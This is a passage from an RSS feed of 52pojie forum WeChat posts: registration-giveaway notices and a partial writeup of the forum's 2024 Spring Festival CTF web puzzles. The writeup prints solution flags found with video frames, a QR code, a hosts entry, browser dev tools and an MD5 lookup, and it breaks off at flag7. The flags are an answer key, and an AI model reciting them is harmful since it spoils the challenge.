inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"></span><strong><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（再</span><span style="display: inline-block; text-indent: initial;">抽4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“新</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法，<strong style="letter-spacing: 0.544px;"><span><span style="letter-spacing: 0.544px; text-decoration: underline;"><strong><span><em>上次参加完活动的同学这次参加还需要重新分享上传。</em></span></strong></span></span></strong></span></strong></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"></span><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周二3</span></strong><span style="display: inline-block; text-indent: initial;">月12</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">再</span><span style="display: inline-block; text-indent: initial;">送4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币，防止错过开放注册，强烈建议设置“星标”</span><span style="display: inline-block; text-indent: initial;">。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1896511-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 08 Mar 2024 16:22:41 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，先送20个账号注册码或300论坛币，今天下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140199&amp;idx=1&amp;sn=e27d9a00557d0f9c49a0c83bf2e455af&amp;chksm=bd50a0338a272925dd0f4fee3e76e24437ba4c948d6c1360805a281024baa0316527535198fe&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140199&amp;idx=1&amp;sn=e27d9a00557d0f9c49a0c83bf2e455af&amp;chksm=bd50a0338a272925dd0f4fee3e76e24437ba4c948d6c1360805a281024baa0316527535198fe&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-03-07 10:15</span> <span style="display: inline-block;">日本</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Thu, 07 Mar 2024 10:14:47 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，先送20个账号注册码或300论坛币，明天下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140197&amp;idx=1&amp;sn=ec1a6e9254da837582d966aae3b09690&amp;chksm=bd50a0318a27292791850cb4b1d614c954cdc106af4840e98671bb8782a911e6218e6788245b&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140197&amp;idx=1&amp;sn=ec1a6e9254da837582d966aae3b09690&amp;chksm=bd50a0318a27292791850cb4b1d614c954cdc106af4840e98671bb8782a911e6218e6788245b&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-03-06 10:46</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Wed, 06 Mar 2024 10:45:47 +0800</pubDate>
</item>
<item>
<title>【2024春节】解题领红包之web题writeup</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140195&amp;idx=1&amp;sn=dfd66f351cc9e8608004f25b94b679cd&amp;chksm=bd50a0378a272921f453cc49095c7c68399b645732d707b4a231a622f669ae2e217eca5ef311&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140195&amp;idx=1&amp;sn=dfd66f351cc9e8608004f25b94b679cd&amp;chksm=bd50a0378a272921f453cc49095c7c68399b645732d707b4a231a622f669ae2e217eca5ef311&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-05 15:20</span> <span style="display: inline-block;">北京</span>
</p>

<p>一年一度的吾爱春节ctf开赛了。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=12a64007&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJePA1uQ5J5Kf1xSV460MbUqNdv8CHxJH3Qc9nhDhPD6NtZsKV1fk5QQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：1254qwer</span></strong></p><p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span><br /></span></strong></p><p><span style="text-decoration: line-through;">一年一度的吾爱春节ctf开赛了</span></p><p>原视频：吾爱破解【2024年春节】解题领红包之Web题https://www.bilibili.com/video/BV1ap421R7VS</p><h2>flag1</h2><p>来源于视频<code style="font-family: SFMono-Regular, Consolas, ;">00:02-00:03</code>几帧，下图圈上的位置白点中间的字就是flag1。</p><p>推荐把视频下载下来，使用播放器/剪辑软件逐帧看会更明显。</p><p><img border="0" class="rich_pages wxw-img" height="436" src="https://https://wechat2rss.xlab.app/img-proxy/?k=265408ec&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJHOFmMAlou4p33GS2RicODyyHhiadPdg33iayiaUwbUOJSxK0icmCdrHhWwg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="776" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag1{52pj2024}</code></p><h2>flag2</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:04-00:07</code>里有四部分被切开的二维码</p><p><img border="0" class="rich_pages wxw-img" height="561" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ef3c316&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ15ZLySH1vsXuscLDxnAP6lNXmVHeeptvKfCrIPBXiaPTicsfuYmFKopA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="463" /></p><p><br /></p><p>全部截图出来，放进PS，使用多边形套索工具圈出图片里的二维码，然后拼到一起。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6676a34a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ6E2tOHic06fp1aOGQqH0WexfuGB8NEibGibNicfFOoXdS1rxrOBDzoe3wA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1066" /></p><p><br /></p><p>这里发现，二维码定位点是白色，因此需要做一次反色处理</p><p>把4个残缺的二维码合并到同一图层，然后点击上方图像-调整-反相</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bbd3a168&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJPkUTSsH90meZ4hDEyRBnxocCV6dlEpwy5c4A36GFLphUGPMBtxMv3g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="508" /></p><p><br /></p><p>这样就能拿到正常的二维码</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=285af1d2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJM0HNA2xGRworIfkpibyIHXcQRA6ZNicOA3J8QCicjib3xIm2CIORSM9YaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1066" /></p><p><br /></p><p>直接扫码，得到一个网址：https://2024challenge.52pojie.cn/</p><p>直接尝试打开，发现无法打开。</p><p>想到去年的思路，同属.52pojie.cn，应该和主站在同一台服务器。</p><p>直接<code style="font-family: SFMono-Regular, Consolas, ;">nslookup 52pojie.cn</code>得到主站ip，然后去系统hosts内添加一条</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">124.232.185.97 2024challenge.52pojie.cn</code></pre><p>就可以打开了。</p><p>先打开浏览器f12，来到网络面板，再输入网址尝试进入。</p><p>flag2就在第一个请求的响应头内的<code style="font-family: SFMono-Regular, Consolas, ;">X-Flag2</code>。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fe30eeb6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJRias7JnuGia9OO7NH8Fh3Y6cEznwoU5qaZK8gPmzAWTOIsjp2QeuFiaoA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag2{xHOpRP}</code></p><h2>flag3</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:00-00:01</code>是横向移动的雪花，中间有串暂停就看不见的文字，就是flag3.</p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag3{GRsgk2}</code></p><p>这段文字自身横向移动方向和背景相反，从而能被人眼识别到。</p><p>类似实现的还有这类视频：</p><p>https://www.bilibili.com/video/BV1qF411u7sc/</p><p>https://www.bilibili.com/video/BV1GM4y1b7JB/</p><h2>flag4</h2><p>继续看上一步的网络面板，可以看到请求了一个名为<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code>，直接预览就能看到flag4</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5f0a5e06&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJXH5kFztGlj9CH9yIrNJptcKf1jbCqlcE0lf5luK4p5jjLk3P74aDOw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag4{YvJZNS}</code></p><p>可以在这里先把图片保存到本地，为寻找flag10做准备。</p><blockquote><p style="margin-bottom: 15px;">这里记录个大坑：最好使用curl等工具下载该图片到本地，最新版Edge自带了个“Edge Image Viewer”，其中的“另存为”功能会导致图片丢失信息，无法找到flag10</p></blockquote><h2>flag5</h2><p>浏览器f12切到元素面板，发现了个<code style="font-family: SFMono-Regular, Consolas, ;">&lt;pre&gt;</code>元素，上方注释了flag5和flag9</p><p>鼠标选中该元素，取消勾选这三个就能在网页上方看到文字（这三个主要作用为将其内部文字颜色设为白色并且使用户无法选中该段文字）</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b115929e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJAPIXNKwrbF4bmMwKCkl64cmPN4uYuGR5kAbIjhFnKzyEWnyq6EgpqA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="263" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8f5855e7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ8Z61V6LjCWe9XhyNWXjlXEOKyAndG2kStiaBNv4okpwmrXXia2sklZKA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>粗略一看，有flag四个字母零散放置。</p><p>打开文本编辑器，找到l的位置，换行，随后在a的位置换行</p><p>可以发现刚好字符数量能对齐，那就按照等字符数量在相同的位置换行（这里一定要使用等宽字体）</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1223147f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJJtY1dib1bsQv6tadL7vGsGiaCJ9mp5C6a9k76Hicb6n1ILfLYXOstbHCA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以发现第一列竖着看刚好是flag5，右侧是flag9的字符画。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag5{P3prqF}</code></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag9{KHTALK}</code></p><h2>flag6</h2><p>直接点击网页内flag6链接打开，检查元素，发现下方有js代码</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=13e41709&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJHQr6oj25icuaG5GHkeBlBz6iaoy0RJb8WTvbxo9Z31cicb86NDib2pbSSw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="989" /></p><p><br /></p><p>看下方js逻辑，大致为寻找md5是<code style="font-family: SFMono-Regular, Consolas, ;">1c450bbafad15ad87c32831fa1a616fc</code>的字符串<code style="font-family: SFMono-Regular, Consolas, ;">$str</code>，然后拼接为形如<code style="font-family: SFMono-Regular, Consolas, ;">flag6{$str}</code>的字符输出。</p><p>打开cmd5.com，搜一下这串md5就能推出结果。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=38101ca3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJwKOJLlC6EsuszCCGWVwoC6RqolEEuwWmumtZ39g1icOr5Mrk4Fh9x2w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1002" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag6{20240217}</code></p><p>（或者，直接点击上方按钮，然后像论坛每次开放注册一样，等几分钟？）</p><p>（实测2.17号18:20跑87s可以出结果，不到2分钟）.</p><h2>flag7</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:21</code>下方出现github仓库网址</p><p>https://github.com/ganlvtech/52pojie-2024-challenge</p><p><img border="0" class="rich_pages wxw-img" 